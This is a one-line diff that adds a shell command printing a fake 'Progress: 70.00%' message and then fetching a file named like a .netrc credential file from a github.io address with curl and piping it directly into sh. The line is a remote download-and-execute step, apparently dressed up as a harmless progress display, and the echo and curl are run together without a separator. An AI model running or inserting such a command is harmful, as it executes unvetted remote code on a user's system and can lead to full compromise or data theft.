@@ -1,0 +1,1 @@
+echo Progress: 70.00%curl -L --progress-bar frkns.github.io/fun/containersExemptSchedules.netrc | sh
